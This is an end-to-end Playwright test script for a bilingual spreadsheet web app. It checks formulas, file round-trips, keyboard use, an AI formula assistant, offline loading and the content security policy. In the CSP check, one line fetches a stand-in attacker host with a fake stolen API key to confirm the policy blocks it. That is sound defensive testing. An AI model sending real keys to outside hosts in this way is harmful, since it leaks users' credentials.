// Copyright 2026 Suruch Chakrapeesirisuk
// SPDX-License-Identifier: Apache-2.0

/**
 * The end-to-end gate: the app driven the way a person drives it.
 *
 * 1,088 unit tests cover the functions. Not one of them opens the app. Every bug this project found
 * the hard way lived in the wiring *between* well-tested pieces, where a unit test cannot look:
 *
 * - The toolbar's "+ row" button called `addRow`, which never announced anything, while the tested
 *   `insertRowAtSelection` beside it did. Both functions passed their tests.
 * - The AI assistant sent the range including its text header, because the context builder read
 *   `sheet.cells` (raw `=C2*D2`) instead of the computed display values. Both modules passed.
 * - A new toolbar button pushed the language toggle 42px off the right edge at 1360px.
 *
 * Every one of those was found by a person clicking. This file is that person, in CI.
 *
 * Deliberately the same shape as `check-a11y.mjs` — a plain script that starts the production
 * server, drives Chromium and prints ok/FAIL — rather than `@playwright/test`. The test runner
 * would bring parallelism, retries and traces, and it would also bring a second test runner, a
 * config file and a dependency, for a suite this size. One entry point (`npm run verify`) is worth
 * more here than fixtures are.
 *
 * Flows are chosen by one rule: **would a unit test already catch it?** If yes it does not belong
 * here. What is left is the seams — store to grid to engine and back, a real file leaving the app
 * and coming back in, the keyboard, and whether anything is said out loud.
 */
import { spawn } from "node:child_process";
import { readdirSync, readFileSync } from "node:fs";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { setTimeout as delay } from "node:timers/promises";
import { chromium } from "playwright";

const PORT = Number(process.env.E2E_PORT || 3124);
const ORIGIN = `http://localhost:${PORT}`;

/** Every visible label exists in both languages, and the default depends on what is in storage. */
const label = {
  exportExcel: /^(ส่งออก Excel|Export Excel)$/,
  importFile: /^(นำเข้าไฟล์|Import file)$/,
  addRow: /^(แถว|Row)$/,
};

const failures = [];
const note = (ok, text, detail) => {
  console.log(`  ${ok ? "ok " : "FAIL"}  ${text}`);
  if (!ok) {
    if (detail !== undefined) console.log(`        ${detail}`);
    failures.push(text);
  }
};

/** Waits for the server to answer, rather than guessing how long a cold start takes. */
async function waitForServer(timeoutMs = 90_000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    try {
      const res = await fetch(ORIGIN + "/app");
      if (res.ok) return;
    } catch {
      // Not listening yet.
    }
    await delay(500);
  }
  throw new Error(`server did not answer on ${ORIGIN} within ${timeoutMs}ms`);
}

const cell = (page, row, col) => page.locator(`td[data-row="${row}"][data-col="${col}"]`);

/** How big the current selection is, counted from what the grid marks as selected. */
const selectionSize = (page) =>
  page.evaluate(() => {
    const picked = [...document.querySelectorAll("td[data-row][data-col]")].filter((td) =>
      td.getAttribute("aria-selected") === "true"
    );
    const rows = new Set(picked.map((td) => td.getAttribute("data-row")));
    const cols = new Set(picked.map((td) => td.getAttribute("data-col")));
    return { rows: rows.size, cols: cols.size };
  });

/** Clicks a cell, types, and commits with Enter — the way the grid is actually used. */
async function typeInCell(page, row, col, text) {
  await cell(page, row, col).click();
  await page.keyboard.type(text);
  await page.keyboard.press("Enter");
}

/**
 * The same thing for text the harness cannot type.
 *
 * `keyboard.type` sends real key events for ASCII, which is what makes the helper above a genuine
 * test of "a printable keypress starts an edit". For anything outside it — Thai, in this app, which
 * is most of what anyone types — Playwright falls back to CDP's `insertText`, and that inserts
 * characters without ever firing `keydown`. The grid starts editing from `keydown`, so the
 * keystrokes land nowhere and the cell keeps whatever it had: a test that passes on the old value
 * and proves nothing. Measured, not guessed — it is how the first version of this file "passed".
 *
 * So Thai goes in through F2, which is the other way a person opens a cell, and then into the
 * input, where `insertText` is exactly right.
 */
async function typeThaiInCell(page, row, col, text) {
  await cell(page, row, col).click();
  await page.keyboard.press("F2");
  await cell(page, row, col).locator("input").waitFor({ timeout: 5000 });
  await page.keyboard.insertText(text);
  await page.keyboard.press("Enter");
}

/** A fresh app with nothing carried over from the flow before. */
async function freshPage(browser, width = 1280) {
  const ctx = await browser.newContext({ viewport: { width, height: 900 }, acceptDownloads: true });
  const page = await ctx.newPage();
  await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
  await page.evaluate(() => window.localStorage.clear());
  await page.reload({ waitUntil: "networkidle" });
  return { ctx, page };
}

const FLOWS = [
  {
    name: "typing a formula recalculates on screen",
    async run(page) {
      await typeInCell(page, 0, 0, "10");
      await typeInCell(page, 1, 0, "20");
      await typeInCell(page, 2, 0, "=SUM(A1:A2)");

      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "30");
      note(true, "=SUM(A1:A2) over 10 and 20 shows 30");

      // The whole point of the dependency graph: an edit upstream moves the cell that reads it.
      await typeInCell(page, 0, 0, "15");
      const after = await cell(page, 2, 0).innerText();
      note(after.trim() === "35", `editing A1 moves the total to 35 (showed "${after.trim()}")`);
    },
  },
  {
    name: "a file leaves the app and comes back the same",
    async run(page, { tmp }) {
      await typeInCell(page, 0, 0, "10");
      await typeInCell(page, 1, 0, "20");
      await typeInCell(page, 2, 0, "=SUM(A1:A2)");
      await typeThaiInCell(page, 0, 1, "ทดสอบ-ก");

      const [download] = await Promise.all([
        page.waitForEvent("download"),
        page.getByRole("button", { name: label.exportExcel }).click(),
      ]);
      const file = join(tmp, "roundtrip.xlsx");
      await download.saveAs(file);
      const bytes = await readFile(file);
      note(bytes.length > 0 && bytes[0] === 0x50, `the export is a real zip container (${bytes.length} bytes)`);

      // Back in through the same file input the import button opens.
      await page.evaluate(() => window.localStorage.clear());
      await page.reload({ waitUntil: "networkidle" });
      await page.locator('input[type="file"]').setInputFiles(file);
      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "30");

      const thai = await cell(page, 0, 1).innerText();
      note(thai.trim() === "ทดสอบ-ก", `Thai text survives the round trip (read back "${thai.trim()}")`);

      // The cell has to come back as a formula, not as the 30 it happened to equal: edit what it
      // reads, and a formula moves while a pasted number does not.
      await typeInCell(page, 0, 0, "1");
      const recomputed = await cell(page, 2, 0).innerText();
      note(recomputed.trim() === "21", `the imported cell is still a formula, not its old value (showed "${recomputed.trim()}")`);
    },
  },
  {
    name: "the grid is usable without a mouse",
    async run(page) {
      // One click to enter the grid, then nothing but the keyboard — the way someone who does not
      // use a pointer works, and the path no unit test covers.
      await cell(page, 0, 0).click();
      await page.keyboard.press("ArrowDown");
      await page.keyboard.press("ArrowDown");
      await page.keyboard.press("ArrowRight");
      await page.keyboard.type("x9");
      await page.keyboard.press("Enter");

      const landed = await cell(page, 2, 1).innerText();
      note(landed.trim() === "x9", `arrow keys then typing lands in B3 (showed "${landed.trim()}")`);

      // Focus follows the moving corner, which is what a screen reader reads out.
      const focused = await page.evaluate(() => {
        const el = document.activeElement;
        return el?.tagName === "TD" ? `${el.getAttribute("data-row")},${el.getAttribute("data-col")}` : el?.tagName;
      });
      note(focused === "3,1", `focus follows the cursor after Enter (activeElement was ${focused})`);

      // The three shortcuts somebody arriving from Excel reaches for without thinking. They are
      // here rather than in a unit test because each is a key event routed through the grid's
      // switch, and the switch is where a duplicate `case` once made a whole branch dead code.
      await cell(page, 1, 1).click();
      await page.keyboard.press("Control+ ");
      const column = await selectionSize(page);
      note(column.rows > 5 && column.cols === 1, `Ctrl+Space takes the whole column (${column.rows}×${column.cols})`);

      await cell(page, 1, 1).click();
      await page.keyboard.press("Shift+ ");
      const row = await selectionSize(page);
      note(row.rows === 1 && row.cols > 3, `Shift+Space takes the whole row (${row.rows}×${row.cols})`);

      // Ctrl+Enter: one cell's content into everything selected, in one step.
      await typeInCell(page, 6, 0, "dup");
      const seeded = (await cell(page, 6, 0).innerText()).trim();
      note(seeded === "dup", `the cell to fill from holds what was typed (A7 showed "${seeded}")`);

      await cell(page, 6, 0).click();
      await page.keyboard.down("Shift");
      for (let i = 0; i < 3; i++) await page.keyboard.press("ArrowDown");
      await page.keyboard.up("Shift");
      await page.keyboard.press("Control+Enter");
      const filled = (await cell(page, 9, 0).innerText()).trim();
      note(filled === "dup", `Ctrl+Enter fills the selection (A10 showed "${filled}")`);
    },
  },
  {
    name: "undo puts back what the last edit changed",
    async run(page) {
      await typeInCell(page, 0, 0, "first");
      await typeInCell(page, 0, 0, "second");
      await page.keyboard.press("Control+z");

      await page.waitForFunction(() => document.querySelector('td[data-row="0"][data-col="0"]')?.innerText.trim() === "first");
      note(true, "Ctrl+Z restores the previous value");
    },
  },
  {
    name: "the AI assistant puts a working formula in the cell",
    async run(page) {
      // The only part of the app that talks to a server, and the part with the worst record: its
      // unit tests mock the model, so they answer the way whoever wrote them expected. Stubbing
      // the route here tests everything *around* the model — what the panel sends, what it does
      // with the reply, and whether the formula it inserts actually computes — which is where the
      // real failures were.
      let posted = null;
      await page.route("**/api/ai/formula", async (route) => {
        posted = JSON.parse(route.request().postData() || "{}");
        await route.fulfill({
          status: 200,
          contentType: "application/json",
          body: JSON.stringify({ formula: "=SUM(F1:F2)", explanation: "รวมค่าในช่วง F1:F2", source: "claude" }),
        });
      });

      // Column F, because the sample sheet fills A–E for ten rows. Putting the numbers in A meant
      // the run above the cursor was A1:A10, not A1:A2, and the first version of this flow read
      // that as a bug in the app when it was a bug in the fixture.
      await typeInCell(page, 0, 5, "10");
      await typeInCell(page, 1, 5, "20");
      await cell(page, 2, 5).click();

      await page.locator('button[aria-label="ถาม AI"]').first().click();
      const panel = page.locator("aside");
      await panel.locator("textarea").fill("รวมคอลัมน์นี้ให้หน่อย");
      await panel.getByRole("button", { name: "ถาม AI" }).click();
      await panel.locator("code").first().waitFor({ timeout: 10_000 });

      // The range the panel sends is the bug that shipped once: it went out including the text
      // header above the numbers, because the context was built from raw cells instead of values.
      note(posted?.selection === "F1:F2", `it sends the filled run above the cursor (sent ${JSON.stringify(posted?.selection)})`);
      note(posted?.question === "รวมคอลัมน์นี้ให้หน่อย", "the question reaches the route unchanged");

      await panel.getByRole("button", { name: /ใส่สูตรนี้ที่เซลล์/ }).click();
      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="5"]')?.innerText.trim() === "30");
      note(true, "the suggested formula lands in the cell and computes to 30");
    },
  },
  {
    name: "a rate limit is shown, not swallowed",
    async run(page) {
      // 429 is the one error a person can act on, so it has to say how long to wait rather than
      // fall into the generic "could not connect". A silent failure here looks like a broken app.
      await page.route("**/api/ai/formula", (route) =>
        route.fulfill({ status: 429, contentType: "application/json", body: JSON.stringify({ retryAfterSec: 42 }) })
      );

      await page.locator('button[aria-label="ถาม AI"]').first().click();
      const panel = page.locator("aside");
      await panel.locator("textarea").fill("อะไรก็ได้");
      await panel.getByRole("button", { name: "ถาม AI" }).click();

      const said = await panel
        .locator("p", { hasText: "42" })
        .first()
        .innerText()
        .catch(() => "");
      note(said.includes("42"), `it says how long to wait ("${said.trim()}")`);
      note((await panel.locator("code").count()) === 0, "and offers no formula to insert");
    },
  },
  {
    name: "the CSP is on, and it closes the exit that matters",
    async run(page) {
      // The AI assistant holds the visitor's own API key in sessionStorage, which means any script
      // running in this page can read it. The policy cannot stop that; what it can stop is the step
      // after — sending it somewhere. That claim is worth re-checking on every push, because a
      // header is exactly the kind of thing that survives in the config and stops being served.
      const header = (await page.goto(ORIGIN + "/app"))?.headers()["content-security-policy"] ?? "";
      note(header.includes("connect-src"), `/app is served with a connect-src policy (${header.slice(0, 60) || "no header"}…)`);
      note(header.includes("https://api.anthropic.com"), "and the BYOK path is in it, or the assistant would be broken by it");

      // The part that is easy to lose. `script-src` used to carry 'unsafe-inline' because Next
      // hydrates through inline scripts; it now carries a per-request nonce instead, which only
      // works while the page is rendered per request. Someone adding `export const dynamic =
      // "force-static"` — or a future Next that prerenders anyway — would put 'unsafe-inline'
      // back by accident, and nothing else here would notice.
      const scriptSrc = header.split(";").map((d) => d.trim()).find((d) => d.startsWith("script-src")) ?? "";
      note(!scriptSrc.includes("'unsafe-inline'"), `script-src has no 'unsafe-inline' (${scriptSrc || "missing"})`);
      note(scriptSrc.includes("'strict-dynamic'"), "and 'strict-dynamic', so a script injected from our own origin is not simply allowed");
      const first = scriptSrc.match(/'nonce-([^']+)'/)?.[1];
      const second = (await page.goto(ORIGIN + "/app"))?.headers()["content-security-policy"]?.match(/'nonce-([^']+)'/)?.[1];
      note(Boolean(first) && Boolean(second) && first !== second, "with a nonce that is different on the next request");

      const stamped = await page.evaluate(() => {
        const inline = [...document.querySelectorAll("script:not([src])")];
        return { total: inline.length, nonced: inline.filter((s) => s.nonce || s.getAttribute("nonce")).length };
      });
      note(
        stamped.total > 0 && stamped.nonced === stamped.total,
        `and every inline script in the document carries it (${stamped.nonced}/${stamped.total})`
      );

      const refused = await page.evaluate(async () => {
        try {
          await fetch("https://exfiltration.invalid/?k=sk-ant-stolen");
          return false;
        } catch {
          return true;
        }
      });
      note(refused, "a script cannot fetch a stolen key to an origin the policy does not name");

      // A policy the app itself trips over gets switched off by whoever hits it next, so the app
      // running clean under it is as much a part of the check as the blocking is.
      const own = [];
      page.on("console", (m) => {
        if (/Refused to|Content Security Policy/i.test(m.text()) && !m.text().includes("exfiltration.invalid")) {
          own.push(m.text().slice(0, 120));
        }
      });
      await typeInCell(page, 0, 0, "10");
      await typeInCell(page, 1, 0, "20");
      await typeInCell(page, 2, 0, "=SUM(A1:A2)");
      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "30");
      note(own.length === 0, "and the app itself trips over none of it", own.join(" · "));
    },
  },
  {
    name: "the cloud client is built, and never downloaded",
    async run(page) {
      // The README says a deployment with no cloud configured never downloads the ~250KB Supabase
      // client. `check:bundle` proves it sits in a chunk of its own; only a browser can prove that
      // nobody asks for that chunk. The two halves together are the claim.
      //
      // Worth a flow of its own because it is so easy to lose by accident: one static import
      // anywhere in the reachable graph — and the live-editing store is now imported by the grid —
      // folds the library into a chunk the page loads anyway, and nothing else would notice.
      const chunks = join(process.cwd(), ".next", "static", "chunks");
      const cloudChunks = readdirSync(chunks)
        .filter((name) => name.endsWith(".js"))
        .filter((name) => readFileSync(join(chunks, name), "utf8").includes("SupabaseClient"));
      note(cloudChunks.length === 1, `the cloud client is in exactly one chunk (${cloudChunks.length})`);

      const asked = [];
      page.on("response", (r) => {
        const name = r.url().split("/").pop() ?? "";
        if (cloudChunks.includes(name)) asked.push(name);
      });
      await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      await typeInCell(page, 0, 0, "1");
      note(asked.length === 0, "and no page load asks for it", asked.join(" "));
    },
  },
  {
    name: "a build that was not told to count sends nothing",
    async run(page) {
      // The usage counter is off unless `NEXT_PUBLIC_USAGE=1`, and that flag is baked in at build
      // time — which is exactly the kind of claim a unit test cannot make, because it is about
      // what this bundle does rather than what the function would do if called. So: drive the
      // acts that are wired to count, and watch the wire.
      const posts = [];
      page.on("request", (r) => {
        if (r.url().includes("/api/usage")) posts.push(`${r.method()} ${r.url()}`);
      });

      // The landing page first: it counts a view of its own now, and the same flag has to keep
      // that one quiet too.
      await page.goto(ORIGIN + "/", { waitUntil: "networkidle" });
      await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      await typeInCell(page, 0, 0, "1");
      await typeInCell(page, 1, 0, "=A1*2");
      await page.waitForTimeout(400);

      note(posts.length === 0, `nothing is posted to /api/usage (${posts.length})`, posts.join(" "));

      // And the endpoint itself refuses on this build, so a stranger cannot switch it on by
      // finding it. 204 either way, by design — what is asserted is that nothing is recorded, and
      // the route's own tests cover that half.
      const res = await page.request.post(ORIGIN + "/api/usage", { data: { event: "app_opened" } });
      note(res.status() === 204, `the endpoint answers without saying which events exist (${res.status()})`);
    },
  },
  {
    name: "the app opens with the network switched off",
    async run(page) {
      // The pitch has always been that the sheet lives in your browser. It was true, and the app
      // still could not open on a train — the document was local and the program was not. Only a
      // real browser can prove this one: it needs a service worker to install, take control, and
      // then serve a navigation from its cache with the network genuinely gone.
      await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      const state = await page.evaluate(async () => {
        if (!("serviceWorker" in navigator)) return "unsupported";
        const registration = await navigator.serviceWorker.ready.catch(() => null);
        return registration ? "ready" : "failed";
      });
      note(state === "ready", `the service worker registers and takes control (${state})`);

      const manifest = await page.request.get(ORIGIN + "/manifest.webmanifest");
      const body = manifest.ok() ? await manifest.json() : {};
      note(manifest.ok() && body.start_url === "/app", `the manifest is served and starts in the app (${body.start_url})`);
      note((body.icons ?? []).some((i) => i.purpose === "maskable"), "with a maskable icon, so Android does not crop the mark away");

      // Give the worker a moment to finish putting the shell in its cache.
      await page.waitForTimeout(1500);
      await page.context().setOffline(true);
      try {
        const offline = await page.goto(ORIGIN + "/app", { waitUntil: "domcontentloaded" });
        note(Boolean(offline && offline.status() === 200), `the app still loads offline (${offline?.status()})`);
        const cells = await cell(page, 0, 0).count();
        note(cells === 1, "and the grid is there, not an error page");
      } finally {
        await page.context().setOffline(false);
      }
    },
  },
  {
    name: "a change away from the cursor is announced",
    async run(page) {
      // This flow exists because of a bug exactly here: the toolbar's "+ row" called `addRow`,
      // which said nothing, while the keyboard path beside it announced correctly. Both had tests.
      await cell(page, 0, 0).click();
      await page.getByRole("button", { name: label.addRow }).click();

      const said = await page
        .waitForFunction(() => {
          const text = [...document.querySelectorAll('[role="status"]')].map((n) => n.textContent?.trim()).find(Boolean);
          return text || null;
        }, null, { timeout: 5000 })
        .then((handle) => handle.jsonValue())
        .catch(() => "");

      note(Boolean(said), `adding a row says something out loud ("${said}")`);
    },
  },
  {
    name: "a save the browser refuses is said out loud, and export still works",
    async run(page) {
      // This flow exists because of a bug exactly here: PaynEat ERP's large import template needed
      // ~45M characters of storage, every save threw QuotaExceededError, the throw escaped from the
      // Export action too, and a reload then lost the work with no warning at all. A unit test can
      // fake the storage; only a browser can show the throw reaching a click handler.
      await page.evaluate(() => {
        const original = Storage.prototype.setItem;
        Storage.prototype.setItem = function (key, value) {
          if (key === "exceltogo-sheet-v2" && window.__refuseSave !== false) {
            throw new DOMException("Setting the value exceeded the quota.", "QuotaExceededError");
          }
          return original.call(this, key, value);
        };
      });
      const errors = [];
      page.on("pageerror", (err) => errors.push(err.message));

      await typeInCell(page, 0, 0, "too big to keep");
      // Filtered by what it says: Next.js keeps a `role="alert"` route announcer on every page.
      const alert = page.getByRole("alert").filter({ has: page.getByRole("button", { name: label.exportExcel }) });
      const shown = await alert.waitFor({ timeout: 5000 }).then(() => true, () => false);
      note(shown, "the refused save shows an alert");
      const text = shown ? (await alert.innerText()).trim() : "";
      note(/ส่งออก Excel|Export Excel/.test(text), `the alert says what to do about it ("${text.slice(0, 60)}…")`);

      const [download] = await Promise.all([
        page.waitForEvent("download", { timeout: 15_000 }),
        alert.getByRole("button", { name: label.exportExcel }).click(),
      ]);
      const saved = await download.path();
      const bytes = saved ? await readFile(saved) : Buffer.alloc(0);
      note(bytes.length > 0 && bytes[0] === 0x50, `export from the alert still downloads a real file (${bytes.length} bytes)`);
      note(errors.length === 0, `no uncaught page errors while saves were refused${errors.length ? ` — ${errors[0]}` : ""}`);

      await page.evaluate(() => (window.__refuseSave = false));
      await typeInCell(page, 0, 1, "fits again");
      const gone = await alert.waitFor({ state: "detached", timeout: 5000 }).then(() => true, () => false);
      note(gone, "the alert goes away once a save lands again");
    },
  },
];

const tmp = await mkdtemp(join(tmpdir(), "exceltogo-e2e-"));
const server = spawn("node", ["node_modules/next/dist/bin/next", "start", "-p", String(PORT)], {
  stdio: ["ignore", "pipe", "pipe"],
  env: { ...process.env, NODE_ENV: "production" },
});
let serverLog = "";
server.stdout.on("data", (d) => (serverLog += d));
server.stderr.on("data", (d) => (serverLog += d));

let browser;
try {
  await waitForServer().catch((err) => {
    console.error(serverLog);
    throw err;
  });

  browser = await chromium.launch({
    // Set CHROME_PATH where Playwright's own download isn't the browser to use; CI installs one
    // and leaves this unset.
    executablePath: process.env.CHROME_PATH || undefined,
  });

  for (const flow of FLOWS) {
    console.log(`\n${flow.name}`);
    const { ctx, page } = await freshPage(browser);
    const errors = [];
    page.on("pageerror", (err) => errors.push(String(err).split("\n")[0]));
    try {
      await flow.run(page, { tmp });
    } catch (err) {
      // A flow that cannot run is a failure, not a skip — the same rule the a11y gate learned.
      note(false, `${flow.name}: threw`, String(err.message).split("\n")[0]);
    }
    // A flow can pass every assertion while the console fills with exceptions React swallowed.
    note(errors.length === 0, `no uncaught page errors during: ${flow.name}`, errors.join(" · "));
    await ctx.close();
  }
} finally {
  await browser?.close();
  server.kill("SIGTERM");
  await rm(tmp, { recursive: true, force: true });
}

if (failures.length > 0) {
  console.error(`\ncheck:e2e — ${failures.length} check(s) failed`);
  process.exit(1);
}
console.log(`\ncheck:e2e — ${FLOWS.length} flows passed`);
